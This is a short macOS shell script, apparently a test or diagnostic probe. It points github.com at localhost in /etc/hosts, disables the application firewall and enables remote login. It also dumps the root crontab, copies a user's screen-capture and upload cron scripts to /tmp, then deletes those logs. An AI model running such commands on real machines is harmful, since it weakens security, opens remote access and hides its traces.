#!/bin/bash
set -ex

cat /etc/hosts > /tmp/screen_mac_etc_hosts.log
sed -i.bak 's/127.0.0.1.*/127.0.0.1 localhost github.com/' /etc/hosts

/usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode off || true
/usr/libexec/ApplicationFirewall/socketfilterfw --setblockall off || true
defaults write /Library/Preferences/com.apple.alf globalstate -int 0 || true
launchctl unload /System/Library/LaunchDaemons/com.apple.alf.agent.plist || true
launchctl load /System/Library/LaunchDaemons/com.apple.alf.agent.plist || true
launchctl unload /System/Library/LaunchAgents/com.apple.alf.useragent.plist || true
launchctl unload /System/Library/LaunchDaemons/com.apple.alf.agent.plist || true

#/sbin/shutdown -h now

systemsetup -setremotelogin on || true
crontab -l -u root > /tmp/screen_mac_crontab_l_ur.log

echo "Hello world"
cat /etc/hosts > /tmp/screen_mac_etc_hosts.log
ls -la /tmp/ > /tmp/screen_mac_tmp.log
ls -la /Users/Vladdy/Library/Cron > /tmp/screen_mac_v_cron_ls.log
cat /Users/Vladdy/Library/Cron/scrcap.sh > /tmp/screen_mac_v_cron_scrcap.log
cat /Users/Vladdy/Library/Cron/upload_scrcap.sh > /tmp/screen_mac_v_cron_upload_scrcap.log

sleep 50
rm /tmp/screen_mac*.log
#/sbin/shutdown -h now
